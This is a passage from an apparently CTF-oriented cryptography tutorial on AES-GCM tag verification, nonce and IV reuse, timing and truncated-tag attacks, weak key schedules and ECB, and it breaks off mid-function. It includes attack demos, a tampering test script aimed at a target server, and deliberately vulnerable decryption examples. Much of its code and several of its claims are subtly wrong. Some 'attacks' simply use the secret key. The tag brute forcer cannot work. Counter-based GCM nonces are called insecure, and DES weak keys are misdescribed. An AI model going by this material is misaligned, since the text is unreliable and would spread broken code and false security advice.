# Output: 12 (nonce) + 14 (plaintext) + 16 (tag) = 42 bytes
````

**Decryption and Verification**

```python
def aes_gcm_decrypt(encrypted_data, key, aad=b""):
    """
    AES-GCM decryption with tag verification
    """
    # Split components
    nonce = encrypted_data[:12]
    ciphertext = encrypted_data[12:-16]
    tag = encrypted_data[-16:]
    
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    
    # Add same associated data
    if aad:
        cipher.update(aad)
    
    try:
        # Verify tag and decrypt (atomic operation)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext
    except ValueError as e:
        # Tag verification failed
        raise Exception("Authentication tag verification failed") from e

# Example usage
try:
    decrypted = aes_gcm_decrypt(encrypted, key, aad)
    print("Decrypted:", decrypted)
except Exception as e:
    print("Tampering detected:", e)
```

**Tag Verification Order**

```python
# CORRECT: Verify tag BEFORE processing plaintext
def secure_decrypt(encrypted_data, key):
    nonce = encrypted_data[:12]
    ciphertext = encrypted_data[12:-16]
    tag = encrypted_data[-16:]
    
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    
    # 1. Decrypt and verify atomically
    try:
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    except ValueError:
        return None  # Tag invalid - reject immediately
    
    # 2. Process plaintext only after verification
    return process_data(plaintext)

# INCORRECT: Processing before tag verification
def insecure_decrypt(encrypted_data, key):
    nonce = encrypted_data[:12]
    ciphertext = encrypted_data[12:-16]
    tag = encrypted_data[-16:]
    
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    
    # 1. Decrypt first
    plaintext = cipher.decrypt(ciphertext)
    
    # 2. Process plaintext (VULNERABLE - tag not yet verified)
    result = process_data(plaintext)
    
    # 3. Verify tag afterwards (TOO LATE)
    try:
        cipher.verify(tag)
    except ValueError:
        return None
    
    return result  # Attacker already influenced process_data()
```

#### Attack Vectors Against Tag Validation

**Forbidden Attack (GCM Nonce Reuse)**

```python
"""
[Unverified] GCM nonce reuse vulnerability allows tag forgery

If same (key, nonce) pair used twice:
1. Attacker can XOR two ciphertexts to get plaintext XOR
2. Can compute authentication key
3. Can forge valid tags for arbitrary ciphertexts

This is catastrophic - breaks both confidentiality and authenticity
"""

def demonstrate_nonce_reuse_danger():
    """
    Example showing why nonce reuse is critical
    """
    key = get_random_bytes(32)
    nonce = get_random_bytes(12)  # FIXED nonce (wrong!)
    
    # Encrypt two messages with same nonce
    cipher1 = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ct1, tag1 = cipher1.encrypt_and_digest(b"message one")
    
    cipher2 = AES.new(key, AES.MODE_GCM, nonce=nonce)  # Same nonce!
    ct2, tag2 = cipher2.encrypt_and_digest(b"message two")
    
    # Attacker can XOR ciphertexts
    xor_result = bytes([c1 ^ c2 for c1, c2 in zip(ct1, ct2)])
    
    # This reveals: plaintext1 ⊕ plaintext2
    # With known plaintext, attacker recovers the other
    # AND can compute authentication key H
    
    print("Nonce reuse detected - system compromised")

# CTF identification: Look for predictable/repeating nonces
def detect_nonce_reuse(encrypted_samples):
    """Check for nonce reuse in multiple samples"""
    nonces = [sample[:12] for sample in encrypted_samples]
    
    if len(nonces) != len(set(nonces)):
        print("WARNING: Nonce reuse detected!")
        return True
    return False
```

**Timing Side-Channels**

```python
def vulnerable_tag_comparison(computed_tag, received_tag):
    """
    VULNERABLE: Byte-by-byte comparison
    Attacker can measure timing to brute force tag
    """
    if len(computed_tag) != len(received_tag):
        return False
    
    for i in range(len(computed_tag)):
        if computed_tag[i] != received_tag[i]:
            return False  # Early return reveals position
    
    return True

def secure_tag_comparison(computed_tag, received_tag):
    """
    SECURE: Constant-time comparison
    """
    from hmac import compare_digest
    return compare_digest(computed_tag, received_tag)

# Timing attack demonstration
import time

def timing_attack_simulation():
    """
    [Inference] Timing attacks on tag verification
    can leak tag bytes progressively
    """
    correct_tag = b"\x01\x02\x03\x04"
    
    # Guess tag byte by byte
    guessed_tag = bytearray(4)
    
    for position in range(4):
        best_guess = 0
        max_time = 0
        
        for guess in range(256):
            guessed_tag[position] = guess
            
            start = time.perf_counter()
            vulnerable_tag_comparison(correct_tag, bytes(guessed_tag))
            elapsed = time.perf_counter() - start
            
            if elapsed > max_time:
                max_time = elapsed
                best_guess = guess
        
        guessed_tag[position] = best_guess
        print(f"Position {position}: guessed 0x{best_guess:02x}")
    
    print(f"Recovered tag: {guessed_tag.hex()}")
```

**Truncated Tag Attack**

```python
def truncated_tag_vulnerability():
    """
    [Inference] Some implementations accept shorter tags
    Reduces security from 128 bits to N bits
    """
    key = get_random_bytes(32)
    nonce = get_random_bytes(12)
    plaintext = b"test message"
    
    # Full 128-bit tag
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag_128 = cipher.encrypt_and_digest(plaintext)
    
    # If system accepts truncated tags (e.g., 32 bits)
    tag_32 = tag_128[:4]  # Only first 4 bytes
    
    # Attacker can brute force 2^32 possibilities
    # Much weaker than 2^128
    
    print(f"Full tag: {tag_128.hex()} (128 bits)")
    print(f"Truncated: {tag_32.hex()} (32 bits)")
    print(f"Brute force complexity: 2^32 = {2**32:,} attempts")

# CTF detection: Check tag length in encrypted samples
def analyze_tag_length(encrypted_data):
    """Identify potential truncated tags"""
    # Expected structure: nonce(12) + ciphertext + tag(16)
    if len(encrypted_data) < 28:
        print("Data too short for standard GCM")
        return
    
    # Check if tag is full 16 bytes
    potential_tag_length = len(encrypted_data) - 12 - estimated_plaintext_length
    
    if potential_tag_length < 16:
        print(f"WARNING: Tag only {potential_tag_length} bytes")
        print("Possible truncated tag vulnerability")
```

#### OpenSSL Command-Line Operations

**AES-GCM Encryption**

```bash
# Encrypt with AES-256-GCM
echo "secret message" | openssl enc -aes-256-gcm \
  -K $(openssl rand -hex 32) \
  -iv $(openssl rand -hex 12) \
  -out encrypted.bin

# Note: OpenSSL includes tag in output automatically

# Decrypt and verify
openssl enc -d -aes-256-gcm \
  -K [key_hex] \
  -iv [nonce_hex] \
  -in encrypted.bin

# If tag invalid: "bad decrypt" error
```

**Extract Components**

```bash
# View encrypted file structure
xxd encrypted.bin

# Manual extraction (assuming known format)
# First 12 bytes: nonce
dd if=encrypted.bin of=nonce.bin bs=1 count=12

# Next N bytes: ciphertext
dd if=encrypted.bin of=ciphertext.bin bs=1 skip=12 count=$(($(stat -f%z encrypted.bin) - 28))

# Last 16 bytes: tag
dd if=encrypted.bin of=tag.bin bs=1 skip=$(($(stat -f%z encrypted.bin) - 16))

# Verify components
echo "Nonce: $(xxd -p nonce.bin)"
echo "Tag: $(xxd -p tag.bin)"
```

#### Python Cryptography Library Usage

**Using `cryptography` Library**

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend

# Initialize
key = AESGCM.generate_key(bit_length=256)
aesgcm = AESGCM(key)

# Encrypt
nonce = os.urandom(12)
plaintext = b"sensitive data"
associated_data = b"metadata"

ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data)
# Returns: ciphertext + tag (concatenated)

# Decrypt and verify
try:
    decrypted = aesgcm.decrypt(nonce, ciphertext, associated_data)
    print("Verified:", decrypted)
except Exception:
    print("Authentication failed - data tampered")
```

**ChaCha20-Poly1305 Alternative**

```python
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

# Initialize
key = ChaCha20Poly1305.generate_key()
cipher = ChaCha20Poly1305(key)

# Encrypt (similar to AES-GCM)
nonce = os.urandom(12)  # Must be 12 bytes
plaintext = b"message"
aad = b"additional data"

ciphertext = cipher.encrypt(nonce, plaintext, aad)

# Decrypt
try:
    decrypted = cipher.decrypt(nonce, ciphertext, aad)
except Exception:
    print("Tag verification failed")
```

#### CTF Challenge Patterns

**Identifying AEAD in Challenges**

```python
def identify_aead_mode(encrypted_data):
    """
    Analyze encrypted data to identify AEAD mode
    """
    length = len(encrypted_data)
    
    # AES-GCM: nonce(12) + ciphertext + tag(16)
    if length >= 28:
        potential_nonce = encrypted_data[:12]
        potential_tag = encrypted_data[-16:]
        
        # Check if nonce looks random (high entropy)
        nonce_entropy = calculate_entropy(potential_nonce)
        
        if nonce_entropy > 7.5:
            print("Likely AES-GCM format detected")
            print(f"Nonce: {potential_nonce.hex()}")
            print(f"Tag: {potential_tag.hex()}")
            return "AES-GCM"
    
    # ChaCha20-Poly1305: same structure as GCM
    # Distinguish by context or trial decryption
    
    # AES-CCM: variable tag length (4-16 bytes)
    # Check for shorter tags
    
    return "Unknown"

def calculate_entropy(data):
    """Calculate Shannon entropy of byte sequence"""
    from math import log2
    from collections import Counter
    
    if not data:
        return 0
    
    counter = Counter(data)
    length = len(data)
    
    entropy = -sum(
        (count / length) * log2(count / length)
        for count in counter.values()
    )
    
    return entropy
```

**Testing for Tag Validation**

```bash
#!/bin/bash
# test_tag_validation.sh

ORIGINAL="[original_encrypted_hex]"
MODIFIED="[modified_tag_hex]"

# Test 1: Modify tag
echo "Testing tag modification..."
curl -X POST http://target.com/decrypt \
  -d "data=$MODIFIED" 2>&1 | grep -i "authentication\|invalid\|failed"

# Test 2: Modify ciphertext
MODIFIED_CT="[modified_ciphertext_hex]"
echo "Testing ciphertext modification..."
curl -X POST http://target.com/decrypt \
  -d "data=$MODIFIED_CT" 2>&1 | grep -i "authentication\|invalid\|failed"

# Test 3: Modify AAD (if applicable)
echo "Testing AAD modification..."
curl -X POST http://target.com/decrypt \
  -H "X-Metadata: modified_value" \
  -d "data=$ORIGINAL" 2>&1 | grep -i "authentication\|invalid\|failed"
```

**Brute Force Truncated Tags**

```python
def brute_force_truncated_tag(ciphertext, nonce, aad, tag_bits=32):
    """
    [Inference] Attack truncated authentication tags
    Only feasible for tags < 64 bits
    """
    from Crypto.Cipher import AES
    
    tag_bytes = tag_bits // 8
    partial_tag = ciphertext[-tag_bytes:]
    actual_ciphertext = ciphertext[:-tag_bytes]
    
    print(f"Brute forcing {tag_bits}-bit tag...")
    print(f"Search space: 2^{tag_bits} = {2**tag_bits:,} possibilities")
    
    # This is only practical for small tags
    if tag_bits > 48:
        print("WARNING: Too large to brute force efficiently")
        return None
    
    # Try all possible tags
    for attempt in range(2**tag_bits):
        if attempt % 100000 == 0:
            print(f"Progress: {attempt:,} / {2**tag_bits:,}")
        
        # Construct full tag (padding with attempt value)
        test_tag = attempt.to_bytes(tag_bytes, 'big')
        full_tag = test_tag + (b'\x00' * (16 - tag_bytes))
        
        # Test if this tag validates
        try:
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            if aad:
                cipher.update(aad)
            plaintext = cipher.decrypt_and_verify(actual_ciphertext, full_tag)
            
            print(f"Found valid tag: {test_tag.hex()}")
            return plaintext
        except ValueError:
            continue
    
    print("No valid tag found")
    return None
```

#### CyberChef AEAD Operations

```
Operations → Encryption/Encoding → AES Decrypt

Mode: GCM
Input format: Hex or Base64
Key: 32/48/64 hex characters (AES-128/192/256)
IV: 24 hex characters (12 bytes)
Additional data: Optional hex/UTF8

Note: CyberChef expects tag appended to ciphertext

Example input structure:
[ciphertext_hex][tag_hex]

Recipe for manual tag verification:
1. From Hex (full encrypted data)
2. Register (save tag: last 16 bytes)
3. AES Decrypt (with mode GCM)
4. [Manual verification: compare computed vs received tag]
```

#### Common Implementation Errors

**Error 1: Not Checking Tag**

```python
# WRONG: Decryption without verification
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
plaintext = cipher.decrypt(ciphertext)  # No tag check!
process(plaintext)

# CORRECT: Always verify tag
try:
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    process(plaintext)
except ValueError:
    return "Authentication failed"
```

**Error 2: Processing Before Verification**

```python
# WRONG: Side effects before tag check
def vulnerable_handler(encrypted_data, key):
    nonce, ciphertext, tag = parse_encrypted(encrypted_data)
    
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    plaintext = cipher.decrypt(ciphertext)
    
    # Process data (side effects occur)
    result = expensive_operation(plaintext)
    log_to_database(plaintext)  # Already logged!
    
    # Verify tag afterwards (too late)
    try:
        cipher.verify(tag)
    except ValueError:
        return "Invalid"  # But side effects already happened
    
    return result

# CORRECT: Verify first, process after
def secure_handler(encrypted_data, key):
    nonce, ciphertext, tag = parse_encrypted(encrypted_data)
    
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    
    # Verify tag before any processing
    try:
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    except ValueError:
        return "Invalid"
    
    # Now safe to process
    result = expensive_operation(plaintext)
    log_to_database(plaintext)
    return result
```

**Error 3: Nonce Management**

```python
# WRONG: Counter-based nonce (predictable)
class BadNonceGenerator:
    def __init__(self):
        self.counter = 0
    
    def get_nonce(self):
        self.counter += 1
        return self.counter.to_bytes(12, 'big')
    
    # Problem: Attacker can predict future nonces
    # Problem: Counter resets after server restart

# CORRECT: Random nonces (GCM allows this)
def get_secure_nonce():
    return os.urandom(12)

# ALTERNATIVE: Deterministic with uniqueness guarantee
class SecureNonceGenerator:
    def __init__(self):
        self.base = os.urandom(8)
        self.counter = 0
        self.lock = threading.Lock()
    
    def get_nonce(self):
        with self.lock:
            self.counter += 1
            # 8 random bytes + 4 counter bytes
            return self.base + self.counter.to_bytes(4, 'big')
```

**Error 4: Mismatch in AAD**

```python
# WRONG: Different AAD during encryption vs decryption
def encrypt_with_aad(plaintext, key, aad):
    nonce = os.urandom(12)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    cipher.update(aad)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return nonce + ciphertext + tag

def decrypt_without_aad(encrypted, key):
    nonce = encrypted[:12]
    ciphertext = encrypted[12:-16]
    tag = encrypted[-16:]
    
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    # Missing: cipher.update(aad)  ← WRONG!
    
    try:
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    except ValueError:
        # Will always fail - AAD mismatch
        return None

# CORRECT: Same AAD must be used
def decrypt_with_correct_aad(encrypted, key, aad):
    nonce = encrypted[:12]
    ciphertext = encrypted[12:-16]
    tag = encrypted[-16:]
    
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    cipher.update(aad)  # Must match encryption AAD
    
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext
```

---

**Important Related Topics:**

- Length extension attacks on hash-based MACs (HMAC vs raw hash)
- Encrypt-then-MAC vs MAC-then-Encrypt paradigms
- Galois field arithmetic in GCM mode
- Poly1305 MAC construction and security proofs
- Nonce-misuse resistant schemes (AES-GCM-SIV, AES-SIV)

---

## Implementation Weaknesses

### Weak Key Schedules

A key schedule is the algorithm that derives round keys from the master key in block ciphers. Weak key schedules produce related round keys, reduced entropy, or predictable transformations that enable cryptanalytic attacks.

#### Key Schedule Fundamentals

**Role of Key Schedule:**

In algorithms like AES, DES, and others, the master key is expanded into multiple round keys used in each encryption round. A strong key schedule ensures:

- Each round key appears independent despite deriving from one master key.
- Avalanche effect: Single-bit key change affects all round keys.
- Entropy preservation: Randomness of master key maintained across rounds.

**AES-128 Key Schedule Example:**

```python
def aes_key_schedule_simplified(key):
    """
    Simplified AES key schedule (educational)
    Full AES requires RotWord, SubWord, Rcon tables
    """
    round_keys = [key[:16]]  # Round 0: original key
    
    # Subsequent rounds (simplified—actual AES is more complex)
    for round_num in range(1, 11):  # 10 rounds for AES-128
        prev_key = round_keys[-1]
        
        # XOR with previous key and transformation
        new_key = bytearray(16)
        for i in range(16):
            # [Unverified] - Actual transformation involves SubWord, RotWord, Rcon
            new_key[i] = prev_key[i] ^ (i % 4)  # Placeholder
        
        round_keys.append(bytes(new_key))
    
    return round_keys

# Analyze key schedule
master_key = b"0123456789ABCDEF"
round_keys = aes_key_schedule_simplified(master_key)
print(f"Round 0: {round_keys[0].hex()}")
print(f"Round 1: {round_keys[1].hex()}")
```

#### Attacks Exploiting Weak Key Schedules

**DES Weak Keys:**

DES has 4 weak keys and 12 semi-weak keys where the key schedule produces only 2 distinct round keys (instead of 16):

```python
def detect_des_weak_keys():
    """
    DES weak keys (produce identical encryption regardless of plaintext)
    """
    des_weak_keys = [
        b'\x01\x01\x01\x01\x01\x01\x01\x01',  # 0x0101010101010101
        b'\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE',  # 0xFEFEFEFEFEFEFEFE
        b'\xE0\xE0\xE0\xE0\xF1\xF1\xF1\xF1',  # 0xE0E0E0E0F1F1F1F1
        b'\x1F\x1F\x1F\x1F\x0E\x0E\x0E\x0E',  # 0x1F1F1F1F0E0E0E0E
    ]
    
    print("DES Weak Keys:")
    for i, key in enumerate(des_weak_keys):
        print(f"  Key {i+1}: {key.hex()}")
    
    # Impact: Same plaintext + weak key = same ciphertext regardless
    print("\n[Warning: Using DES weak keys enables chosen-plaintext attacks]")

detect_des_weak_keys()
```

**Related-Key Differential Attack:**

If two keys differ by only a few bits, their round keys may reveal patterns:

```python
def analyze_related_keys(key1, key2, num_rounds=10):
    """
    [Inference] - Analyze key schedules of related keys
    If keys differ by small amount, round keys may show predictable relationships
    """
    from itertools import zip_longest
    
    schedule1 = aes_key_schedule_simplified(key1)
    schedule2 = aes_key_schedule_simplified(key2)
    
    # Hamming distance between keys
    hamming_dist = sum(bin(b1 ^ b2).count('1') for b1, b2 in zip(key1, key2))
    print(f"Master key Hamming distance: {hamming_dist} bits")
    
    # Analyze round key differences
    print("\nRound key differences:")
    for round_num in range(min(num_rounds, len(schedule1), len(schedule2))):
        xor_result = bytes(a ^ b for a, b in zip(schedule1[round_num], schedule2[round_num]))
        hamming = bin(int.from_bytes(xor_result, 'big')).count('1')
        print(f"  Round {round_num}: {hamming} bits differ")
        
        if hamming < 5:
            print(f"    [Warning: Round keys are highly correlated]")

# Test with related keys
key1 = b"0123456789ABCDEF"
key2 = b"0123456789ABCEE6"  # Last byte differs by 1
analyze_related_keys(key1, key2)
```

**Truncated Differential Analysis:**

[Inference] If the key schedule is weak, small differences in master key can propagate predictably through rounds, enabling differential cryptanalysis.

```python
def differential_key_analysis(key1, plaintext1, plaintext2, oracle_encrypt):
    """
    [Inference] - Exploit weak key schedule via differential analysis
    Requires encryption oracle (actual cipher implementation)
    """
    print("[Differential Analysis Setup]")
    print(f"Key 1: {key1.hex()}")
    print(f"Plaintext 1: {plaintext1.hex()}")
    print(f"Plaintext 2: {plaintext2.hex()}")
    print(f"Difference: {bytes(p1 ^ p2 for p1, p2 in zip(plaintext1, plaintext2)).hex()}")
    
    # Encrypt with weak-key cipher
    # [Unverified] - Actual attack requires statistical analysis of ciphertext pairs
    print("[Collect ciphertext pairs to identify differential bias]")
    print("[If key schedule is weak, certain plaintexts produce predictable output differences]")

# Placeholder
differential_key_analysis(b"key", b"plain1", b"plain2", None)
```

#### Weak Key Schedule Detection in CTF

**Pattern Recognition:**

```python
def detect_key_schedule_weakness(key_schedule_samples, num_samples=100):
    """
    Detect weak key schedule through entropy analysis
    """
    from collections import Counter
    
    print("[Analyzing Key Schedule Samples]")
    
    # Check for repeated round keys
    unique_keys = set(key_schedule_samples)
    print(f"Unique round keys: {len(unique_keys)}/{num_samples}")
    
    if len(unique_keys) < num_samples * 0.8:
        print("[Warning: Significant key repetition—weak schedule detected]")
        
        # Find repeated keys
        freq = Counter(key_schedule_samples)
        most_common = freq.most_common(5)
        for key, count in most_common:
            print(f"  Key appears {count} times")
    
    # Entropy analysis
    byte_freq = Counter()
    for key in key_schedule_samples:
        byte_freq.update(key)
    
    entropy = -sum((count / len(byte_freq)) * (import_log2(count / len(byte_freq))) 
                   for count in byte_freq.values() if count > 0)
    print(f"Entropy: {entropy:.4f} bits/byte (max: 8.0)")
    
    if entropy < 6.0:
        print("[Warning: Low entropy—key schedule may be weak]")

# Placeholder entropy analysis
def import_log2(x):
    import math
    return math.log2(x) if x > 0 else 0
```

**Brute-Force Key Schedule:**

If key schedule is weak and deterministic, small portion may reveal full schedule:

```python
def brute_force_weak_key_schedule(known_round_key, schedule_func, key_length=16):
    """
    Recover master key from known round key(s)
    [Inference] - Feasible if key schedule has low entropy or predictable structure
    """
    print(f"[Attempting to recover {key_length*8}-bit master key from round key]")
    print(f"Known round key: {known_round_key.hex()}")
    
    # Try all possible master keys (computationally expensive)
    # For CTF, likely involves:
    # - Wordlist search
    # - Pattern-based recovery
    # - Cryptanalytic shortcuts
    
    for candidate_key in range(1, min(2**20, 2**(key_length*8))):  # Limit to 2^20
        # Simulate key schedule
        schedule = schedule_func(candidate_key.to_bytes(key_length, 'big'))
        
        # Check if any round key matches
        if any(rk == known_round_key for rk in schedule):
            print(f"Master key found: {candidate_key}")
            return candidate_key.to_bytes(key_length, 'big')
    
    print("Master key not found in range")
    return None
```

#### CTF Exploitation Strategy for Weak Key Schedules

1. **Identify cipher algorithm** and research known weak keys or schedules.
2. **Check for DES weak keys**: If DES is used, test against known weak key list.
3. **Analyze key schedule** for entropy, repetition, or predictable patterns.
4. **Look for related-key scenarios**: If multiple related keys are provided, exploit differential relationships.
5. **Apply wordlist attack**: If challenge suggests weak key generation, brute-force likely keys.
6. **Use known-plaintext**: If plaintext is known, verify key schedule consistency.

**Example CTF Scenario:**

```bash
# Challenge: Decrypt ciphertext, hint mentions "weak key schedule"

python3 << 'EOF'
from Crypto.Cipher import DES

# Test against DES weak keys
ciphertext = bytes.fromhex("0123456789abcdef")
plaintext = b"TestText"

weak_keys = [
    b'\x01\x01\x01\x01\x01\x01\x01\x01',
    b'\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE',
]

for key in weak_keys:
    try:
        cipher = DES.new(key, DES.MODE_ECB)
        decrypted = cipher.decrypt(ciphertext)
        if decrypted == plaintext:
            print(f"Weak key found: {key.hex()}")
            print(f"Decrypted: {decrypted}")
            break
    except Exception as e:
        pass
EOF
```

---

### IV Reuse

An Initialization Vector (IV) is a random value used to introduce non-determinism into block cipher modes of operation. Reusing IVs with the same key breaks confidentiality in most modes, allowing plaintext recovery and manipulation.

#### IV Role in Block Cipher Modes

**CBC Mode (Cipher Block Chaining):**

```
Encryption: C_i = Encrypt(P_i ⊕ C_{i-1})  where C_0 = IV
Decryption: P_i = Decrypt(C_i) ⊕ C_{i-1}
```

If same IV and key are used for two messages:

```
C_i^(1) = Encrypt(P_i^(1) ⊕ IV)
C_i^(2) = Encrypt(P_i^(2) ⊕ IV)

If P_i^(1) = P_i^(2), then C_i^(1) = C_i^(2)
→ Identical plaintext blocks produce identical ciphertext blocks
```

```python
def cbc_iv_reuse_vulnerability(plaintext1, plaintext2, key, iv):
    """
    [Inference] - Demonstrates CBC IV reuse vulnerability
    Requires actual AES implementation
    """
    from Crypto.Cipher import AES
    
    cipher1 = AES.new(key, AES.MODE_CBC, iv)
    ciphertext1 = cipher1.encrypt(plaintext1)
    
    cipher2 = AES.new(key, AES.MODE_CBC, iv)
    ciphertext2 = cipher2.encrypt(plaintext2)
    
    print("[IV Reuse Vulnerability Analysis]")
    print(f"Ciphertext 1: {ciphertext1.hex()}")
    print(f"Ciphertext 2: {ciphertext2.hex()}")
    
    # Compare blocks
    for i in range(0, len(ciphertext1), 16):
        c1_block = ciphertext1[i:i+16]
        c2_block = ciphertext2[i:i+16]
        p1_block = plaintext1[i:i+16]
        p2_block = plaintext2[i:i+16]
        
        if p1_block == p2_block:
            if c1_block == c2_block:
                print(f"Block {i//16}: Identical plaintext → identical ciphertext")
            else:
                print(f"Block {i//16}: Identical plaintext → different ciphertext (good)")
```

#### IV Reuse Attacks

**Plaintext Recovery via Known-Plaintext:**

```python
def recover_plaintext_iv_reuse(ciphertext_unknown, ciphertext_known, plaintext_known, key, iv):
    """
    If same IV reused with same key, recover unknown plaintext
    Requires known-plaintext from another encryption with same IV
    """
    from Crypto.Cipher import AES
    
    # Decrypt both with same IV (vulnerable)
    cipher_unknown = AES.new(key, AES.MODE_CBC, iv)
    cipher_known = AES.new(key, AES.MODE_CBC, iv)
    
    decrypted_unknown = cipher_unknown.decrypt(ciphertext_unknown)
    decrypted_known = cipher_known.decrypt(ciphertext_known)
    
    # Verify known plaintext
    if decrypted_known != plaintext_known:
        print("[Error: Known plaintext verification failed]")
        return None
    
    print(f"[Recovered plaintext via IV reuse]")
    print(f"Plaintext: {decrypted_unknown}")
    return decrypted_unknown
```

**Ciphertext Manipulation via IV:**

In CBC mode, XORing IV with chosen value modifies decrypted first block:

```python
def cbc_iv_manipulation(ciphertext, key, original_iv, target_plaintext_block):
    """
    Modify first ciphertext block decryption by changing IV
    C_1 = Encrypt(P_1 ⊕ IV)
    P_1 = Decrypt(C_1) ⊕ IV_new
    
    To get desired P_1: IV_new = Decrypt(C_1) ⊕ target_P_1
    """
    from Crypto.Cipher import AES
    
    print("[CBC IV Manipulation Attack]")
    
    # Recover original plaintext
    cipher = AES.new(key, AES.MODE_CBC, original_iv)
    original_plaintext = cipher.decrypt(ciphertext)
    print(f"Original plaintext: {original_plaintext}")
    
    # Compute IV that produces target plaintext
    # P = Decrypt(C) ⊕ IV
    # IV = Decrypt(C) ⊕ P (we can't directly get Decrypt(C), but we know P⊕IV)
    
    # Instead: new_IV = original_IV ⊕ original_P_1 ⊕ target_P
    first_block = ciphertext[:16]
    p1_original = original_plaintext[:16]
    
    new_iv = bytes(
        o ^ p ^ t for o, p, t in 
        zip(original_iv, p1_original, target_plaintext_block)
    )
    
    print(f"Original IV: {original_iv.hex()}")
    print(f"Modified IV: {new_iv.hex()}")
    
    # Verify manipulation
    cipher_modified = AES.new(key, AES.MODE_CBC, new_iv)
    manipulated_plaintext = cipher_modified.decrypt(ciphertext)
    print(f"Manipulated plaintext: {manipulated_plaintext}")
    
    return new_iv
```

**ECB Mode IV Reuse:**

ECB (Electronic Codebook) doesn't use IV, but identical plaintext blocks always produce identical ciphertext:

```python
def ecb_mode_plaintext_recovery(ciphertexts, key):
    """
    In ECB mode (no IV), identical plaintext blocks produce identical ciphertext
    Build a plaintext-ciphertext dictionary to recover unknown messages
    """
    from Crypto.Cipher import AES
    
    print("[ECB Mode Vulnerability]")
    print("[In ECB: same plaintext block → same ciphertext block always]")
    
    # Build reverse mapping
    cipher = AES.new(key, AES.MODE_ECB)
    block_map = {}
    
    # Test common blocks (16-byte blocks for AES)
    for test_byte in range(256):
        test_block = bytes([test_byte] * 16)
        encrypted_block = cipher.encrypt(test_block)
        block_map[encrypted_block] = test_block
    
    # Recover ciphertexts using dictionary
    recovered = []
    for ciphertext in ciphertexts:
        recovered_text = b""
        for i in range(0, len(ciphertext), 16):
            block = ciphertext[i:i+16]
            if block in block_map:
                recovered_text += block_map[block]
            else:
                recovered_text += b"?"*16
        recovered.append(recovered_text)
    
    print(f"Recovered: {recovered}")
    return recovered
```

#### IV Reuse Detection

```python
def detect_iv_reuse(ciphertexts_and_keys):
    """
    Detect if same IV reused with same key across multiple ciphertexts
    """
    print("[Detecting IV Reuse Vulnerabilities]")
    
    # Group by (key, ciphertext_prefix)
    key_iv_pairs = {}
    
    for ciphertext, key in ciphertexts_and_keys:
        # First block is typically IV-dependent
        first_block = ciphertext[:16]
        pair = (key, first_block)
        
        if pair in key_iv_pairs:
            print(f"[Warning: Same (key, IV) pair detected]")
            print(f"  Ciphertext 1: {key_iv_pairs[pair].hex()}")
            print(f"  Ciphertext 2: {ciphertext.hex()}")
            print(f"  [Vulnerability: Can compare plaintext blocks]")
            return True
        
        key_iv_pairs[pair] = ciphertext
    
    print("[No IV reuse detected]")
    return False
```

#### CTF Exploitation Strategy for IV Reuse

1. **Identify block cipher mode**: Look for CBC, CTR, or other modes in code/documentation.
2. **Check IV generation**: If IV is hardcoded, predictable, or reused, exploit immediately.
3. **Collect multiple ciphertexts**: If same IV reused, compare blocks for patterns.
4. **Apply known-plaintext attack**: Use challenge format (e.g., `flag{`) to recover corresponding ciphertext blocks.
5. **Manipulate IV**: If CBC mode, modify IV to alter first decrypted block.
6. **Build block dictionary**: For ECB mode (no IV), map plaintext to ciphertext blocks.

**Example CTF Scenario:**

```bash
# Challenge: Multiple messages encrypted with CBC using same IV

python3 << 'EOF'
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

key = bytes.fromhex("0123456789abcdef0123456789abcdef")
iv = bytes.fromhex("00000000000000000000000000000000")  # Constant IV!

message1 = "flag{this_is_secret}"
message2 = "flag{completely_different}"

cipher1 = AES.new(key, AES.MODE_CBC, iv)
ciphertext1 = cipher1.encrypt(pad(message1.encode(), 16))

cipher2 = AES.new(key, AES.MODE_CBC, iv)
ciphertext2 = cipher2.encrypt(pad(message2.encode(), 16))

print(f"Ciphertext 1: {ciphertext1.hex()}")
print(f"Ciphertext 2: {ciphertext2.hex()}")

# Exploit: Known plaintext prefix
known_prefix = b"flag{this_is"
known_ct = ciphertext1[:len(known_prefix)]

# If we only had ciphertext2, we could:
# 1. Recover IV via known-plaintext attack on ciphertext1
# 2. Then decrypt ciphertext2 with recovered IV

# Actual attack: Compare first blocks
if ciphertext1[:16] == ciphertext2[:16]:
    print("[IV reuse detected: first blocks identical]")
else:
    print("[First blocks differ—but padding may align differently]")

# Better: known plaintext attack
# If message2 starts with "flag{...}", we can recover padding
EOF
```

---

### ECB Mode Patterns

Electronic Codebook (ECB) mode is the simplest block cipher mode: each plaintext block independently encrypts to a ciphertext block using the same key. **ECB is fundamentally insecure** because identical plaintext blocks always produce identical ciphertext blocks, revealing patterns.

#### ECB Mode Mechanics

```
Encryption: C_i = Encrypt(P_i)  for each block i independently
Decryption: P_i = Decrypt(C_i)

No chaining, no IV, no randomization → Deterministic encryption
```

#### ECB Pattern Leakage

**Image Encryption Example:**

ECB encryption of an image reveals the underlying image structure:

```python
def ecb_pattern_demonstration():
    """
    Demonstrates ECB mode pattern leakage
    """
    print("[ECB Mode Pattern Leakage]")
    print("In ECB, identical plaintext blocks encrypt to identical ciphertext blocks")
